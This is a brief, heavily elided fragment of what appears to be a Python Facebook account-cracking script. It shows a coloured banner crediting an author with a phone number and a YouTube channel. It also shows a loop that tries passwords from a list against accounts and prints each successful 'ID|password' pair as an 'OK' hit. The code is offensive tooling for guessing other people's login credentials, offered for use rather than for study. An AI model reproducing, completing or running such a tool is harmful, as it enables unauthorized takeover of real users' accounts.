...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mNAYEM HASAN
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801405193528
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mNayem Hasan
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
	...
	for pw in pwv:
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				...
				print('\r%s [NAYEM-OK] %s|%s        '%(h,idf,pw))
